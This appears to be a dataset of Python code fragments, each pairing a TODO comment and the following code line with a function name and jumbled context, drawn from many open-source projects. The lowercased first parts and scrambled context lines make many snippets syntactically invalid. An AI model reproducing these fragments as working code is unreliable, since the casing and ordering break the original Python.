"""todo: document me.""" </s> def __init__(self, rng, pi, renormalize=false):	__init__ self.pi = pi assert self.pi.min() >= 0.0
# todo(mriedem): perform some version discovery at some point. </s> kwargs = {	put kwargs = {} if version is not None: 'headers': { 'OpenStack-API-Version': 'placement %s' % version
# todo some kind of non-zero check to make sure that this passes. </s> sentry.initialize('')	create_db def create_db(c):
# todo: it's a bit weird that to_dict modifies the object. </s> original_data = getattr(self, 'data', undefined)	to_dict def to_dict(self, *args, **kwargs): self._prepare_data() context = kwargs.get('context', {})
# todo(petef): support hard/soft limits </s> resource.setrlimit(res, (value, value))	preexec_fn if res is None: raise ValueError('unknown rlimit "%s"' % limit) if self.gid: try:
raise mpdnotimplemented # todo </s> def _commands(self):	_commands @register(r'^commands$')
# todo(brett.cannon) implement </s> pass	test_path_importer_cache_has_None def test_path_importer_cache_has_None(self):
# todo: localization support </s> ws.emit(	skills_manager global skills_manager_timer, ws if skills_manager_timer is None: Message("speak", {'utterance': "Checking for Updates"})) logger.debug("==== Invoking Mycroft Skill Manager: " + MSM_BIN)
# todo(eric_k): unicorn@778171fc9546c1fc3d1341ff1151eab379848ea0 doesn't like writing to </s> if reg in {'fs'}:	write_back_register self._emu.reg_write(self._to_unicorn_id('EFLAGS'), self._cpu.read_register('EFLAGS')) return logger.warning(f"Skipping {reg} write. Unicorn unsupported register write.") return
# todo(hvy): make percentile computation faster for gpus </s> return numpy.array((float('nan'),) * 7)	_percentiles_cpu except IndexError:
# todo: handle this </s> 0, 0, 0, 0, positioning_x + position_x, positioning_y + position_y)	draw_background_image context.transform(
# todo(mitmul): use cupy.random.choice if it becomes available </s> disable_inds = np.random.choice(	_create_bbox_labels if len(fg_inds) > num_fg: fg_inds = cuda.to_cpu(fg_inds) fg_inds, size=(len(fg_inds) - num_fg), replace=False) labels[disable_inds] = -1
# todo subject.cn from cert? </s> if cleanup:	test_simple_ipa assert proc.returncode == 0, "Return code not 0" assert exists(app_path) os.remove(app_path)
# todo: reuse the utils method for service restarts </s> named_service_name = utils.named_service_name()	restart_service This syncs the bind server with it's new config files. Basically this restarts the service to apply the changes. dns_restart_command = "service %s restart" % named_service_name ret = utils.subprocess_call(dns_restart_command, True)
# todo parameters </s> f.write(u"(todo parameters)")	print_Call if stmt.expression: f.write(u"pass ") f.write(u'\n')
# todo: use complete list of `order_by` fields </s> result.order_by(order_by[0].replace('^', '-'))	join result.fields.keys(), permit_not=True) with rows.locale_context(output_locale): export_to_uri(destination, result, encoding=output_encoding)
# todo(dcramer): implement timing for tsdb </s> return statsd.timer(_get_key(key),	timer def timer(key): rate=settings.SENTRY_METRICS_SAMPLE_RATE)
# todo: also validate that subsystem is a </s> if parent_cache.subsystem.is_cut():	__init__ self.subsystem = subsystem if parent_cache: raise ValueError( "parent_cache must be from an uncut subsystem")
# todo: remove conditional for v4 (always do the following) </s> path = purepath(path).parts	modify :obj:`pathlib.PurePath` instead. if not isinstance(path, (list, tuple)): root = deepcopy(struct) last_parent = root
# todo(soren): we need this until we can stop polling in the rpc code </s> greenthread.sleep(0.3)	test_console_output output = yield self.cloud.get_console_output(context=self.context, instance_id=[instance_id]) self.assertEquals(b64decode(output['output']), 'FAKE CONSOLE OUTPUT') rv = yield self.cloud.terminate_instances(self.context, [instance_id])
# todo: check values? </s> values = [v.lower() for v in values]	transfer_encoding @CheckFieldSyntax(TOK_PARAM) def transfer_encoding(self, name, values): return values
# todo: add metadata support when it is merged from develop </s> _close_conn(conn)	save_load ) )
# todo: we should store a storage version number in later releases. </s> if isinstance(state, tuple) and len(state) == 5:	__setstate__ def __setstate__(self, state): (number_of_nodes, readonly, src_nodes, dst_nodes) dgl_warning("The object is pickled pre-0.4.2.  Multigraph flag is ignored in 0.4.3") num_nodes, _, readonly, src, dst = state
# todo: have to assume trans.user here... </s> user = trans.user	serialize_annotation def serialize_annotation( self, trans, item, key ): Get and serialize an `item`'s annotation. sa_session = self.app.model.context returned = item.get_item_annotation_str( sa_session, user, item )
# @todo: filter dropdown to just those who are accepting volunteers </s> f = current.db.auth_user.organisation_id	customise_auth_user_controller " if you do not fall into these", ) return attr
# todo: properly get whether there is a body from the response </s> finished.callback((response, none))	callback finished = Deferred() if response.code == http.NO_CONTENT: else: response.deliverBody(_Accumulator(finished))
self.asserttrue(greps(err, "unit zz-unknown.service does not exist, proceeding anyway.")) #todo </s> else:	test_3812_unmask_some_unknown if real: self.assertEqual(end, 0) self.assertEqual(end, 5) self.assertTrue(greps(err, "Unit zz-unknown.service not found."))
# todo: change this -- func def changed </s> log_action_taken_on_message(1000, 'uid1')	test_log_action_taken_on_message_invalid_user message = Message('subject', 'body', 'uid1', users=[self.user, self.user2], requires_response=True) db.session.add(message) self.assertEqual(len(list(message.history)), 0)
# todo: implement me </s> loss = criterion(depth, image)	_test_smoke criterion = tgm.losses.DepthSmoothnessLoss()
# todo: delete this method when no longer needed </s> with open(path) as file:	get_test_graph def get_test_graph(path): text = file.read() tokens = clean_text_by_word(text)
assert false # todo </s> elif exportformat == exportformat.npy:	execute opH5Writer.close() elif exportFormat == ExportFormat.Npy: assert False # TODO result[0] = not self.Dirty.value
@jtu.skip_on_devices("gpu", "tpu")  # todo(b/145608614): svd crashes on gpu. </s> def testmatrixrank(self, shape, dtype, rng_factory):	testMatrixRank for dtype in float_types + complex_types for rng_factory in [jtu.rand_default])) rng = rng_factory() _skip_if_unsupported_type(dtype)
# todo: for now, circumnavigate the detached head issue. </s> for subds in dest.get_dataset_handles(recursive=true):	test_update_simple source.repo.git_remote_remove("origin") dest = install(path=dst_path, source=src_path, recursive=True) AnnexRepo(opj(dst_path, subds), init=True, create=False).git_checkout("master") ok_clean_git(dst_path)
# todo: check syntax, values? </s> values = [v.lower() for v in values]	content_encoding @GenericHeaderSyntax def content_encoding(self, name, values): return values
# todo: test coverage of this branch </s> raise http404	update_subscription email, action, activation_code=None): if not action in ['subscribe', 'update', 'unsubscribe']: my_newsletter = get_object_or_404(Newsletter.on_site, slug=newsletter_slug) my_subscription = get_object_or_404(
# todo(b/147296819): delete this line. </s> get_code = input if _sys.version_info[0] == 3 else raw_input  # pylint: disable=undefined-variable	mount timeout_pattern = 'QueryManager timed out' dfs_log = _os.path.join(_logs_dir(), 'drive_fs.txt') wrote_to_fifo = False while True:
# todo add locales </s> raise yunohosterror("must_be_positive", value_type=type(ttl))	domain_set_settings raise YunohostError("bad_value_type", value_type=type(ttl)) if ttl < 0: domains[domain]["ttl"] = ttl setting_set = True
# todo(garyk): update the volumeops to read the state form the </s> instance.vm_state = vm_states.stopped	_detach_instance_volumes if block_device_mapping: self._vmops.power_off(instance) for disk in block_device_mapping: connection_info = disk['connection_info']
# todo: until we get it working. </s> if facts.is_from_app_store():	generate_lanrev_recipe by this function! keys = recipe["keys"] warn_about_app_store_generation(facts, recipe["type"]) return
pass # todo </s> def handle_request(self, input):	handle_request
# todo: probably warn about this. </s> raise notimplementederror	event @property def event(self):
# @todo: what else? (uninitialized variables!) </s> else:	S3LocationSelectorWidget2 postcode_label = postcode_row[0][0] postcode_row = postcode_row[0][1] postcode_row = "" postcode_label = ""
# todo: handle this more gracefully? </s> self.close()	_pending byte = self._file.read(1) except socket.error: break if byte == '':
# todo: open in new tab </s> return redirect('/admin/django_q/schedule/add/?name=system_importer_file_csv_cron_based&func=dfirtrack_main.importer.file.csv_cron_based.system')	config_check return redirect(reverse('system_list')) else:
# todo: pandas supports timedelta std, otherwise dask raises: </s> assert eq(dds.nunique(), pds.nunique())	test_reductions_non_numeric_dtypes assert eq(dds.count(), pds.count()) check_raises(dds, pds, 'var')
# todo update this code once keras > 2.0.4 is released </s> try:	validate time.sleep(10) continue embedding = keras.models.load_model( weights_h5, custom_objects=CUSTOM_OBJECTS,
# todo don't know how to get right return value </s> return 0xd10c	hook_DefWindowProcA }) def hook_DefWindowProcA(ql, address, params):
#todo: may be this should go in a decorator for use in every command. </s> cmd_str = 'cd %s && git annex get %s %s' % (self.path, optlist, pathlist)	annex_get for key in kwargs.keys(): optlist += " --%s=%s" % (key, kwargs.get(key)) status = self.cmd_call_wrapper.run(cmd_str, log_stderr=False) if status not in [0, None]:
# logger ..." todo: this should be done before plugins discovery </s> setup_logging(config, _cli_log_handler, logfile='letsencrypt.log')	main make_or_verify_core_dir(config.logs_dir, 0o700, os.geteuid(), config.strict_permissions) cli.possible_deprecation_warning(config) logger.debug("certbot version: %s", certbot.__version__)
# todo: really need crs specified properly in agdc-metadata.yaml </s> if projection['datum'] == 'gda94':	_dataset_projection def _dataset_projection(dataset): projection = dataset.metadata_doc['grid_spatial']['projection'] return {'init': 'EPSG:283' + str(abs(projection['zone']))} if projection['datum'] == 'WGS84':
#todo: investigate why the flask provided request.json returns none. </s> data = json.loads(request.data)	hive_data @app.route('/ws/hive_data', methods=['POST']) def hive_data(): logger.debug('Received: {0}'.format(data)) _hive = Hive.get(id=data['hive_id'])
pass # todo </s> def handle_request(self, input):	handle_request
# todo: fill some sane numbers here </s> return -1	getAverageUploadPerRunningTorrent def getAverageUploadPerRunningTorrent(self):
#todo change to native framework call, when plex allows token in header </s> urltoplaylists = misc.getloopback() + '/playlists'	IMPORT jsonItems[UUID].append(itemKey) try: opener = urllib2.build_opener(urllib2.HTTPHandler) request = urllib2.Request(urltoPlayLists)
"""todo: document me.""" </s> def __init__(self, sigma, mu, seed=42):	__init__ self.sigma = sigma self.mu = mu
#todo - use sql for this, much more efficient! </s> return len(self.adaptor.list_bioentry_ids(self.dbid))	__len__ def __len__(self):
# todo g.ind_edges = sub2ind(size(g.w), g.v_in, g.v_out) </s> g.v_in = v_i	adj2vec v_i, v_j = (sparse.tril(G.W)).nonzero() weights = G.W[v_i, v_j] G.v_out = v_j G.weights = weights
# todo: i dont like in place updates. change this to somthing else. </s> combined_arg_id_to_descr = arg_id_to_descr.copy()	ArgDescriptionInferer else: assignee_id_to_descr[-i-1] = ValueArgDescriptor() combined_arg_id_to_descr.update(assignee_id_to_descr) new_scoped_function = (
#todo: update this to try fsfindfolder and fallback to this </s> basepath = os.path.expanduser('/library/application support')	site_data_dir elif sys.platform == 'darwin': if os.uname()[-1] == 'i386': else: from Carbon import Folder, Folders
# todo: logging, or warning </s> print 'retrying with pickle'	_save raise try: f = open(filepath, "wb") pickle.dump(obj, f)
# todo: datetime.date, datetimeindex? </s> if dtype == string_type:	box_dataframe res = pyapi.call_method(class_obj, "DataFrame", ()) for cname, arr, arr_typ, dtype in zip(col_names, col_arrs, arr_typs, dtypes): arr_obj = box_str_arr(arr_typ, arr, c) elif isinstance(dtype, PDCategoricalDtype):
# todo: error checking </s> json_obj = json.loads(content)	list_boards headers = headers, ) return json_obj.boards
# todo(dspasovski): fix this. </s> raise skiptest	TestIndexLanding @mock_es def test_featured(self): self._test_featured() @mock_es
# todo remove this line? i think it's not needed. (dave) </s> save_module(grammar, path, module_node, lines, pickling=false,	_parse old_lines = module_cache_item.lines if old_lines == lines: cache_path=cache_path) return module_node
# todo for now, simply ack msg_new.answer_msg_id </s> self._send_acknowledge(msg_new.answer_msg_id)	_handle_msg_detailed_info msg_new = reader.tgread_object() assert isinstance(msg_new, MsgDetailedInfo) return True
# todo for each sampled sub epoch, validate number of segments </s> ses_block, _ = get_prev_ses_block(sub_blocks, curr.header_hash)	TestWeightProof assert wp is not None assert len(wp.sub_epochs) == sub_epochs assert wpf.validate_weight_proof(wp, curr)
pass  # todo... </s> beam_out[0] = beam	perform beam = beam_trans.transpose(*map(array_trans_dims_order.index, range(array.ndim))) if self.wrap_mode == "pad_zero":
# todo: improve error handling </s> return make_response("error", status_code=500)	handle_ws item = connection_table.get_item(connection_id) if not item:  # pragma: no cover scope = json.loads(item["scope"]) query_string = scope["query_string"]
# todo: it has only one element in current state. handle rest of elements. </s> for value in lazy_values.infer():	infer_django_field key, lazy_values = next(argument_iterator, (None, None)) if key is None and lazy_values is not None: string = value.get_safe_value(default=None) if value.name.string_name == 'str':
# todo: move this config validation to acl object. </s> for vlan in list(self.vlans.values()):	resolve_acls def resolve_acls(): if vlan.acls_in: acls = []
# todo danger error log: unable to save in fs </s> raise errors.internalservererror	post relationship = dump_files_fs(files) except OSError, e: file_list = yield register_files_db(files, relationship, itip_id) for file_desc in file_list:
# todo: handle tuple assignment? </s> if meta_child.value.value:	visit_class if not isinstance(meta_child.value, Const): continue return if isinstance(child, Assign):
pass # todo </s> def handle_request(self, input):	handle_request
# todo this should be more modular </s> if 'bindings' in response:	__fetch_service if 'items' in response: targets += response['items'] targets += response['bindings'] if 'accounts' in response:
# todo increase precision </s> eps = numpy.finfo(float).eps	check_degree_1d val = quadrature(lambda x: x**degree) exact_val = exact(degree) alpha = abs(exact_val) * tol + (1e6+tol+exact_val)*eps if abs(exact_val - val) > alpha:
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo: test me </s> return len(self.node.files_versions[self.clean_filename])	latest_version_number def latest_version_number(self):
# todo resource arns may contain wildcards, e.g. arn:aws:iam::*:role/admin -- </s> session.run(	load_group_policies role_arns = [role_arns] for role_arn in role_arns: ingest_policies_assume_role, GroupName=group_name,
# todo: fix this </s> return false	_ApplyTestOp elif op.op_id in (Id.VTest_ColonPlus, Id.VTest_Plus): if is_falsey: else: self._EvalWordToParts(op.arg_word, quoted, part_vals, is_subst=True)
# todo: unit tests </s> user = auth.user	get_all_projects_smart_folder @must_be_logged_in def get_all_projects_smart_folder(auth, **kwargs): contributed = user.node__contributed nodes = contributed.find(
# todo: non-int dict </s> func_text += "    key_write_map = hpat.dictintint()\n"	gen_agg_func func_text += "    redvar_{}_arr = np.full(n_uniq_keys, _init_val_{}, np.{})\n".format( i, i, typ) func_text += "    curr_write_ind = 0\n" func_text += "    for i in range(len(key_arr)):\n"
# todo implement for all channels </s> def _handle_toggle(self, message):	_handle_toggle return None
#web directories to use in case todo file is empty </s> start = [	Run } CRAWLER_DIR = path.dirname(path.realpath(__file__)) 'https://en.wikipedia.org/wiki/List_of_most_popular_websites', 'http://www.clambr.com/49-free-web-directories-for-building-backlinks/'
# todo: test me </s> def add_contributors_from_dicts(node, user_dicts, auth, email_unregistered=true):	add_contributors_from_dicts contribs = [] for contrib_dict in user_dicts:
# todo: take care of theano to keras port: </s> ))	vgg16 net["conv_2_pool"], 3, "conv_3", 256, activation=activation, net.update(base.conv_pool( net["conv_3_pool"], 3, "conv_4", 512,
#todo: assert that layer inputs are always >= 0 </s> self._layer_wo_act_b_positive = kgraph.copy_layer_wo_activation(	ZPlusFastRule for alpha=1, beta=0 and assumes inputs x >= 0. def __init__(self, layer, state): layer, keep_bias=False, name_template="reversed_kernel_positive_%s")
# truffle todo: revert </s> for __x in _glob2(dirname, basename, dironly): yield __x	_iglob if not dirname: if recursive and _isrecursive(basename): else: for __x in _glob1(dirname, basename, dironly): yield __x
# todo: provide loghandler, which gives access to recent records or return stderr </s> raise skiptest	test_AnnexRepo_annex_proxy except RuntimeError, e: if e.message.find("Failed to run 'git annex proxy") > -1: else: raise
# todo: remove in 0.24 when none is removed </s> if t is none:	_validate_transformers self._validate_names(names) for t in transformers: warnings.warn("Using None as a transformer is deprecated " "in version 0.22 and will be removed in "
# todo: replace with a call to int(_, 16) </s> while count < 8:   # get 8 more characters	UEscape count = 0 value = '\\U' ch = argstr[j:j + 1].lower() j = j + 1
# todo review this </s> if not suppress_exitstatus:	do_status self.ctl.exitstatus = LSBStatusErrorCodes.UNKNOWN self._show_statuses(matching_infos) for info in matching_infos: if info['state'] in states.STOPPED_STATES:
# todo(twd2): send ac mail </s> if rdoc['tid']:	JudgeNotifyConnection post_coros.append(problem.inc(rdoc['domain_id'], rdoc['pid'], 'num_accept', 1)) post_coros.append(domain.inc_user(rdoc['domain_id'], rdoc['uid'], num_accept=1)) post_coros.append(contest.update_status(rdoc['domain_id'], rdoc['tid'], rdoc['uid'], rdoc['_id'], rdoc['pid'], accept, rdoc['score']))
# todo: waitlist </s> log.info("bloc[{index}] @ 0x{address:06x}: {buffer_size:8d}    {list_length:2d} / {capacity:2d}        {memory_size:7d} @ 0x{memory:06x}".format(**heappool))	infoHeap log.info("-------------------------------------------------------------") for heappool in heaplist:
# todo test that non 9.[01].x errors out </s> psycopg2.connect().cursor().execute.side_effect = mocked_execute	test_setupdb_app_main_not_utc_timezone with mock.patch(self.psycopg2_module_path) as psycopg2: app = setupdb_app.SocorroDB(config) psycopg2.connect().cursor().fetchall.side_effect = mocked_fetchall stderr = StringIO()
# todo: turn this into an id lookup on a keystore. </s> return api.ecdsa_bytes2pub(self._power_ups[	pubkey_sig_tuple def pubkey_sig_tuple(self): try: keypairs.SigningKeypair].pub_key) except KeyError:
# todo: only serialize parent object, use: </s> self.api.serialize()	remove if obj.parent is not None and obj.name in obj.parent.children: obj.parent.children.remove(obj.name) self.lock.acquire() try:
if self._ndim == 3: # todo: use hasz </s> lgeos.geoscoordseq_getz(cs, i, byref(dz))	__getitem__ lgeos.GEOSCoordSeq_getX(cs, i, byref(dx)) lgeos.GEOSCoordSeq_getY(cs, i, byref(dy)) return (dx.value, dy.value, dz.value) else:
# todo: make sure this is indeed stdcall </s> self.ql.os.fcall = self.ql.os.fcall_select(stdcall)	ioctl self.ql.mem.write(irp_addr, bytes(irp)) self.ql.log.info("Executing IOCTL with DeviceObject = 0x%x, IRP = 0x%x" %(self.ql.loader.driver_object.DeviceObject, irp_addr)) self.ql.os.fcall.writeParams((self.ql.loader.driver_object.DeviceObject, irp_addr)) try:
# todo: tried to reuse the process, but something seems to be buffering </s> postprocessor = subprocess.popen([self.postprocessor],	__call__ prediction = predictions[0][:lengths[0]-1] comment = ' '.join([token.decode('utf-8') for token in prediction]) stdout=subprocess.PIPE, stdin=subprocess.PIPE,
# todo: specify page range </s> parser = pdfparser(fobj)	pdf_to_text 'Extract all text objects from a PDF file' filename, fobj = get_filename_and_fobj(filename_or_fobj, mode='rb') doc = PDFDocument(parser) parser.set_document(doc)
# todo: remove </s> c.pkg = context['package']	history c.pkg_revisions = get_action('package_revision_list')(context, data_dict) except NotAuthorized: abort(401, _('Unauthorized to read package %s') % '')
# todo: enable specificity beyond hostname (e.g. include scheme, port) </s> tuf_configuration = \	make_tuf_updater def make_tuf_updater( url ): parsed_url = urlparse.urlparse( url ) TUFUpdater.__tuf_configurations.get( parsed_url.hostname ) if tuf_configuration is None:
# todo implement and test this </s> raise exception("unimplemented")	database_names def database_names(self):
# todo! the offset is a bit off. </s> x_delta = child.offsets[0] - layer.offsets[0]	export pdb.gimp_image_set_active_layer(self.img, child) pdb.plug_in_autocrop_layer(self.img, child) y_delta = child.offsets[1] - layer.offsets[1] print('Offsets Delta: {x}, {y}'.format(x=x_delta, y=y_delta))
# todo handle error situations </s> spotify_logged_in.set()	logged_in def logged_in(session, error): spotify_logged_out.clear()
# todo find out what is best used here! </s> 'preferred_dtype': np.float32}	get_properties 'input': (DENSE, SPARSE), 'output': PREDICTIONS,
# todo: add more checks here? </s> if magic in ('fws', 'cws'):	can_parse if len(body) > 5: magic = body[:3] return True return False
# todo: make sure package names can't be changed to look like package ids? </s> if pkg == none:	show if pkg == None: pkg = model.Package.by_name(id) response.status_int = 404 return ''
# todo bring back? </s> mesh = meshtri(x, cells, flat_cell_correction=fcc_type)	lloyd output_filetype=None, ): boundary_verts = mesh.get_boundary_vertices() max_move = tol + 1
# todo: add theano function. </s> raise notimplementederror()	extract_conv2d_patches backend = K.backend() if backend == "theano": elif backend == "tensorflow": import tensorflow
# todo: remove when #980 has been merged </s> info['url'] = formats[-1]['url']	_real_extract 'upload_date': upload_date, } info['ext'] = determine_ext(formats[-1]['url']) return self.video_result(info)
# todo: timestamp as datetime in payload must die. </s> if key == "timestamp":	VumiMessageDescriptor for key, value in modelobj._riak_object._data.iteritems(): if key.startswith(self.prefix): value = self._timestamp_from_json(value) payload[key[len(self.prefix):]] = value
# todo: this won't work for classes with __slots__ </s> if seen is none:	_get_nested_calls visitor = CallVisitor(class_) visitor.visit(node) seen = set() owners = []
# todo: comment as to why this is </s> context = none	remove assert self.__open, "The InformationStore must be open." if context == self.identifier: cspo, cpos, cosp = self.__indicies index, prefix, to_key, from_key = self.__lookup((subject, predicate, object), context)
# todo: must be implemented </s> pass	get_range_using_urls def get_range_using_urls(self, crawler):
# todo implement properties for proteins </s> genes_properties_dict = dict(	differential_expression_score norm_mean2, ) = self.gene_dataset.raw_counts_properties(idx1, idx2) raw_mean1=np.concatenate([mean1, nan]), raw_mean2=np.concatenate([mean2, nan]),
# todo test this </s> def log_sf(self,x):	MitureDistribution class MitureDistribution(MixtureDistribution, DurationDistribution): x = np.asarray(x,dtype=np.float64) K = len(self.components)
# todo: add .data and .grad to syft tensors </s> nn_self._check_encrypted()	_hook_crypten_module def module_float_precision_(nn_self): parameters to normal float parameters""" for p in nn_self.parameters(): p.float_precision_()
# todo(blk-u): this doesn't look like it works as expected. </s> self.assertequal(	test_no_version_path_solidus def test_no_version_path_solidus(self): 'http://localhost/identity/', auth.replace_version('http://localhost/identity/', 'v2.0'))
annot.annotation_metadata.validation_and_reliability = "todo"  # todo </s> annot.annotation_metadata.origin = "centre for digital music"	fill_annoatation_metadata annot.annotation_metadata.annotation_tools = "Sonic Visualizer" annot.annotation_metadata.annotation_rules = "TODO"  # TODO annot.annotation_metadata.annotator.name = "TODO" annot.annotation_metadata.annotator.email = "TODO"  # TODO
return response(status=400)  # todo </s> if not eth_utils.is_checksum_address(new_address):	register new_address = request.form['address'] except KeyError: return Response(status=400)  # TODO if new_address in self.reserved_addresses:
box = self._canvas._render_world._selection_box  # todo: make a way to publicly access this </s> if box.select_state == 2:	_run_operation for inp in operation.get("inputs", []): if inp == "src_box": operation_inputs.append( SelectionBox(
# todo(sbauza): remove the service_id filter in a later release </s> model_query(context, models.computenode).\	service_destroy soft_delete(synchronize_session=False) if service.binary == 'nova-compute': filter(or_(models.ComputeNode.service_id == service_id, models.ComputeNode.host == service['host'])).\
# todo: optimize me </s> return itertools.chain([self], self.get_descendants_recursive(lambda n: n.primary))	node_and_primary_descendants :param node Node: target Node
def generate(self): # todo </s> del self.adl	sample_forwards self.stateseq_norep, self.durations = util.rle(self.stateseq)
# todo this is a workaround since exceptions are currently not correctly stacked </s> pass	search return self._search(self.pattern, string, pos, default(endpos, -1)) except RuntimeError: return self.__compile_cpython_sre().search(string, pos, default(endpos, maxsize()))
# todo: remove dependency on legacy_examples </s> cli_args_to_test = [	test_build_dags and that Airflow is able to successfully parse our DAGs. runner = CliRunner() ['--module-name', 'dagster_examples.toys.log_spew', '--pipeline-name', 'log_spew'], ['--module-name', 'dagster_examples.toys.many_events', '--pipeline-name', 'many_events'],
# todo add test for this </s> if order >= 3:	Affine return_matrices=True) for heatmaps_i, arr_aug, matrix, order in zip(heatmaps, arrs_aug, matrices, order_samples): arr_aug = np.clip(arr_aug, 0.0, 1.0, out=arr_aug) heatmaps_i.arr_0to1 = arr_aug
# todo: add comment here to explain these numbers </s> c.pump(repeat(1, 6))	test_read_request_load_happy s = ReadRequestLoadScenario(c, FakeFlockerClient([node1, node2]), 5, interval=1) d = s.start() s.maintained().addBoth(lambda x: self.fail()) d.addCallback(lambda ignored: s.stop())
# todo: try to find a better way to deal with local execution </s> if self.is_method and not self.locations and self.owner == sy.hook.local_worker:	_execute_readable_plan def _execute_readable_plan(self, *args): result_ids = [sy.ID_PROVIDER.pop()] self._self.send(sy.hook.local_worker, force_send=True) plan_res = self.execute_plan(args, result_ids)
# todo: give a vanilla example </s> .. math::	hamming_loss def hamming_loss(predicted_state, ground_truth_state): HammingLoss = \\frac{1}{T} \\sum_{t}
# todo switch to pytest.skip() if verified to be expected failure </s> pytest.xfail(reason="test requires maxwell or higher")	test_conv_ones if isinstance(NervanaObject.be, NervanaGPU) and NervanaObject.be.compute_capability < (5, 0): if ones_convargs[3] > 32: dtypeu = np.float32 indim, nifm, fshape, nofm, batch_size, stride, pad = ones_convargs
# todo: probabilistic with each route </s> add.append(e('route', id='route%s' % edge, edges=' '.join(route)))	generate_cfg 'http://sumo.dlr.de/xsd/additional_file.xsd') for (edge, route) in self.rts.items(): num_traffic_lights = len(list(traffic_lights.get_properties().keys())) if num_traffic_lights > 0:
# todo: look for a better implementation handling "hold[expression]". </s> types = (	Read else: types = (types,) Symbol("HoldExpression") if (
# todo: fancier. </s> self.lgr.info("fetching artifact... ")	fetch_plugin if not err: if conf["artifact"]: Popen(["git", "clone", conf["artifact"], "{}/plugin".format(jaildir)],
# todo: probably warn about this. </s> raise notimplementederror	event @property def event(self):
""" todo """ </s> pass	set_kernel_lts_refind def set_kernel_lts_refind(self):
# todo: reuse the utils method for service restarts </s> if self.settings.restart_dhcp:	restart_service This restarts the dhcp server and thus applied the newly written config files. :raises CX rc = utils.subprocess_call("service dnsmasq restart") if rc != 0:
# todo: determine if this is object store safe and what needs to be </s> files_path = "%s_files" % input_file[0:-len(".dat")]	__upload_input_files input_upload_response = self.client.upload_input(input_file) self.file_renames[input_file] = input_upload_response['path'] if os.path.exists(files_path): for extra_file in os.listdir(files_path):
name: optional[str] = none) -> common_types.consistenttensortype:  # todo(b/64987151): remove # pytype: disable=annotation-type-mismatch </s> r"""maps `x` to a vocabulary specified by the deferred tensor.	apply_vocabulary file_format: Optional[common_types.VocabularyFileFormatType] = analyzers .DEFAULT_VOCABULARY_FILE_FORMAT, This function also writes domain statistics about the vocabulary min and max values. Note that the min and max are inclusive, and depend on the vocab size,
if isinstance(err, asyncio.cancellederror):  # todo: remove when updated to 3.8 </s> raise	Ledger resolve_results, _, _ = await self.claim_search([], claim_ids=claim_ids) except Exception as err: log.exception("Resolve failed while looking up collection claim ids:") return []
# :todo: implement test. </s> self.skiptest('not implemented yet.')	test_comparison def test_comparison(self):
# todo: instead of attributing it to the word part, it would be </s> raise util.invalidslice(	_EvalBracedVarSub else: if length < 0: "The length of a string slice can't be negative: %d", length, part=part)
# todo: #1823 - workaround for new nickname every restart </s> symbols = list(symbols_tuple)	nickname_from_seed def nickname_from_seed(seed, number_of_pairs=2): random.seed(seed) pairs = []
# todo: this is processor specific </s> mnem = getmnem(ea)	is_call def is_call(ea): Check if the current instruction a CALL instruction if re.match('call\s+far prt', mnem):  return None return re.match('call', mnem)
# todo check transformation to the reference element </s> x_1 = mesh.coors[:-1] + (mesh.coors[1:] - mesh.coors[:-1]) * (-nm.sqrt(1 / 2) + 1) / 2	intGauss2 @staticmethod def intGauss2(mesh, f): x_2 = mesh.coors[:-1] + (mesh.coors[1:] - mesh.coors[:-1]) * (nm.sqrt(1 / 3) + 1) / 2 w = (mesh.coors[1:] - mesh.coors[:-1]) / 2
ret = os.system("cd " + path + " && " + gradlew + " assembledebug")  # todo: change to release </s> if ret != 0:	compile_apk gradlew = os.path.join(path, "gradlew") os.chmod(gradlew, os.stat(gradlew).st_mode | stat.S_IEXEC | stat.S_IXGRP | stat.S_IXOTH) raise Exception("Generation failed") shutil.copy(os.path.join(path, "Phimpme/build/outputs/apk/Phimpme-debug.apk"), output_path)
return skiptest("test doesn't pass yet")  # todo(frostig) </s> def fun(x, y):	testDot def testDot(self): return lax.dot(x, y) xs = [
# todo: consider adding some error handling for bad/failed requests. </s> res = km.record(email, event, properties if properties else {})	track_usage km = KISSmetrics.Client(key=api_key)
# todo this paragraph is necessary, but not sure it works. </s> context = self._user_context.get_context()	get_completions c_names = i.completion_names(self._evaluator, only_modules) completions = [(name, module) for name in c_names] print(next(self._user_context.get_context()), 'x') if not next(context).startswith('.'):  # skip the path
# todo investigate different results between mac and linux/win platforms </s> retinfo.append("function: {:x} instruction: {:x} mapped mlil: {}".format(func.start, ins.address, str(ins.mapped_medium_level_il)))	test_low_il_instructions retinfo.append("Function: {:x} Instruction: {:x} LLIL->MLILS: {}".format(func.start, ins.address, str(sorted(list(map(str, ins.mlils)))))) retinfo.append("Function: {:x} Instruction: {:x} LLIL->HLIL: {}".format(func.start, ins.address, str(ins.hlil))) retinfo.append("Function: {:x} Instruction: {:x} Value: {}".format(func.start, ins.address, str(ins.value))) retinfo.append("Function: {:x} Instruction: {:x} Possible Values: {}".format(func.start, ins.address, str(ins.possible_values)))
# todo: arrange </s> repo = self.remote.new_repo(self.token)	test_create_repo def test_create_repo(self): Test: create/edit a repo object self.assertTrue(self.remote.modify_repo(repo, "name", "testrepo0", self.token)) self.assertTrue(self.remote.modify_repo(repo, "mirror", "http://www.sample.com/path/to/some/repo", self.token))
# todo(user): remove after 184 is out. </s> finalized_filenames = cls.get_filenames(mapreduce_state)	finalize_job state = cls._State.from_json(mapreduce_state.writer_state) files.finalize(state.filenames[0]) state = cls._State(finalized_filenames, []) mapreduce_state.writer_state = state.to_json()
# todo: common crud method </s> user = await self.middleware.call('datastore.query', 'account.bsdusers', [('id', '=', pk)], {'prefix': 'bsdusr_'})	UserService return pk async def do_delete(self, pk): if not user: raise ValidationError(None, f'User {pk} does not exist', errno.ENOENT)
# todo: replace usages of strictredis (redis-py 2.x) with redis in dramatiq 2.0. </s> self.client = client or redis.strictredis(**parameters)	__init__ if url is not None: parameters["connection_pool"] = redis.ConnectionPool.from_url(url)
# todo: internal configuration conflicts within one package. </s> matches = []	_old_concretize self._mark_concrete() Spec.ensure_no_deprecated(self) for x in self.traverse(): if x.external:
# todo: use other libraries. </s> def addr(func_name):	Addr if func_name == '/bin/sh': addr = get_bin_sh_str()
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	destroy function should still succeed.  It's probably a good idea to log a warning in that case.
